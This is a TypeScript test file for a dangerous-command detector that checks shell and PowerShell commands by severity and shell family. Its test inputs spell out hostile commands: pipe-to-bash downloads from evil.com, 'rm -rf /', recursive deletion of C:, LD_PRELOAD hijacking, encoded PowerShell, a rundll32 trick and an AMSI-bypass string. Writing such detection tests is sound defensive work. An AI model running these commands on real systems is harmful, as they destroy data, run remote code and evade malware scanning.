import { describe, expect, test } from "bun:test"
import {
  detect,
  isAllowed,
  getSeverity,
  explain,
  type DangerResult,
} from "../../src/security/dangerous-command-detector"

/**
 * Dangerous Command Detector Tests
 *
 * Tests for unified security detection combining:
 * - Bash/Danger patterns
 * - PowerShell cmdlet detection
 * - Shell classification
 */

describe("detect - basic detection", () => {
  test("safe command returns allowed: true", () => {
    const result = detect("ls -la")
    expect(result.allowed).toBe(true)
    expect(result.severity).toBe("safe")
  })

  test("safe command has no reasons", () => {
    const result = detect("git status")
    expect(result.reasons).toHaveLength(0)
    expect(result.matchedPatterns).toHaveLength(0)
  })
})

describe("detect - bash dangers", () => {
  test("detects bare shell prefix", () => {
    const result = detect("bash -c 'echo hello'", "/bin/bash")
    expect(result.reasons.length).toBeGreaterThan(0)
    expect(result.shellFamily).toBe("posix")
  })

  test("detects command substitution $()", () => {
    const result = detect("echo $(whoami)", "/bin/bash")
    const reasons = result.reasons.join(" ")
    expect(reasons).toContain("command substitution")
  })

  test("detects pipe to shell", () => {
    const result = detect("curl http://example.com | bash", "/bin/bash")
    expect(result.severity).toBe("high")
    expect(result.allowed).toBe(false)
    expect(result.reasons.some((r) => r.toLowerCase().includes("pipe"))).toBe(true)
  })

  test("detects dangerous bash patterns (npm, python, etc)", () => {
    const result = detect("npm install express", "/bin/bash")
    expect(result.severity).toBe("high")
    expect(result.allowed).toBe(false)
  })

  test("detects rm -rf /", () => {
    const result = detect("rm -rf /", "/bin/bash")
    expect(result.severity).toBe("high")
    expect(result.allowed).toBe(false)
  })

  test("detects control characters", () => {
    const result = detect("echo hello\x00world", "/bin/bash")
    expect(result.severity).toBe("high")
  })

  test("detects unicode whitespace", () => {
    const result = detect("echo hello\u200Bworld", "/bin/bash")
    expect(result.severity).toBe("high")
  })

  test("detects environment variable hijacking", () => {
    const result = detect("LD_PRELOAD=/tmp/evil.so command", "/bin/bash")
    expect(result.severity).toBe("high")
    expect(result.reasons.some((r) => r.includes("environment variable"))).toBe(true)
  })
})

describe("detect - powershell dangers", () => {
  test("safe powershell command", () => {
    const result = detect("Get-Process", "powershell.exe")
    expect(result.shellFamily).toBe("powershell")
    expect(result.severity).toBe("safe")
  })

  test("detects Invoke-Expression", () => {
    const result = detect("Invoke-Expression 'whoami'", "powershell.exe")
    expect(result.severity).toBe("high")
    expect(result.allowed).toBe(false)
  })

  test("detects encoded command", () => {
    const result = detect("powershell -enc SQBFAFgAIAA=", "powershell.exe")
    expect(result.severity).toBe("high")
    expect(result.allowed).toBe(false)
  })

  test("detects Invoke-WebRequest", () => {
    const result = detect("Invoke-WebRequest -Uri https://evil.com", "powershell.exe")
    expect(result.severity).toBe("medium")
  })

  test("detects rundll32 (living off the land)", () => {
    const result = detect("rundll32.exe javascript:alert('pwned')", "powershell.exe")
    expect(result.severity).toBe("high")
    expect(result.reasons.some((r) => r.includes("rundll32"))).toBe(true)
  })

  test("detects AMSI bypass", () => {
    const result = detect("[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')", "powershell.exe")
    expect(result.severity).toBe("high")
    expect(result.reasons.some((r) => r.includes("AMSI"))).toBe(true)
  })
})

describe("detect - shell family detection", () => {
  test("detects posix shell", () => {
    const result = detect("ls", "/bin/bash")
    expect(result.shellFamily).toBe("posix")
  })

  test("detects zsh", () => {
    const result = detect("ls", "/bin/zsh")
    expect(result.shellFamily).toBe("posix")
  })

  test("detects powershell", () => {
    const result = detect("Get-Process", "powershell.exe")
    expect(result.shellFamily).toBe("powershell")
  })

  test("detects pwsh", () => {
    const result = detect("Get-Process", "pwsh")
    expect(result.shellFamily).toBe("powershell")
  })

  test("detects cmd", () => {
    const result = detect("dir", "cmd.exe")
    expect(result.shellFamily).toBe("cmd")
  })

  test("unknown shell returns unknown", () => {
    const result = detect("ls", "/usr/bin/unknown-shell")
    expect(result.shellFamily).toBe("unknown")
  })

  test("no shell specified returns unknown", () => {
    const result = detect("ls")
    expect(result.shellFamily).toBe("unknown")
  })
})

describe("isAllowed - quick check", () => {
  test("safe command is allowed", () => {
    expect(isAllowed("ls -la")).toBe(true)
    expect(isAllowed("git status")).toBe(true)
  })

  test("high severity is not allowed", () => {
    expect(isAllowed("rm -rf /")).toBe(false)
    expect(isAllowed("curl http://evil.com | bash")).toBe(false)
  })

  test("with options - strict mode", () => {
    expect(isAllowed("bash -c 'echo'", "/bin/bash", { strictMode: true })).toBe(false)
  })

  test("with options - non-strict mode", () => {
    // In non-strict mode, medium severity is allowed
    const result = detect("bash -c 'echo'", "/bin/bash", { strictMode: false })
    expect(result.allowed).toBe(true)
  })
})

describe("getSeverity - quick severity check", () => {
  test("safe command", () => {
    expect(getSeverity("ls -la")).toBe("safe")
  })

  test("high severity", () => {
    expect(getSeverity("rm -rf /")).toBe("high")
    expect(getSeverity("curl http://evil.com | bash")).toBe("high")
  })

  test("medium severity", () => {
    expect(getSeverity("bash -c 'echo'")).toBe("medium")
  })
})

describe("explain - reason explanation", () => {
  test("safe command has no explanations", () => {
    expect(explain("ls -la")).toHaveLength(0)
  })

  test("dangerous command has explanations", () => {
    const reasons = explain("Invoke-Expression 'whoami'", "powershell.exe")
    expect(reasons.length).toBeGreaterThan(0)
  })
})

describe("detect - suggestions", () => {
  test("high severity has suggestions", () => {
    const result = detect("curl http://evil.com | bash")
    expect(result.suggestions.length).toBeGreaterThan(0)
    expect(result.suggestions.some((s) => s.includes("Download script first"))).toBe(true)
  })

  test("safe command has no suggestions", () => {
    const result = detect("ls -la")
    expect(result.suggestions).toHaveLength(0)
  })
})

describe("detect - matched patterns", () => {
  test("includes matched patterns", () => {
    const result = detect("rm -rf /")
    expect(result.matchedPatterns.length).toBeGreaterThan(0)
  })

  test("patterns are deduplicated", () => {
    const result = detect("$(echo $(whoami))")
    // Should not have duplicate patterns
    const unique = new Set(result.matchedPatterns)
    expect(unique.size).toBe(result.matchedPatterns.length)
  })
})

describe("detect - cmd shell", () => {
  test("detects dangerous cmd patterns", () => {
    const result = detect("del /s /q C:\\*", "cmd.exe")
    expect(result.shellFamily).toBe("cmd")
    // CMD shell uses some powershell-style detection too
  })
})
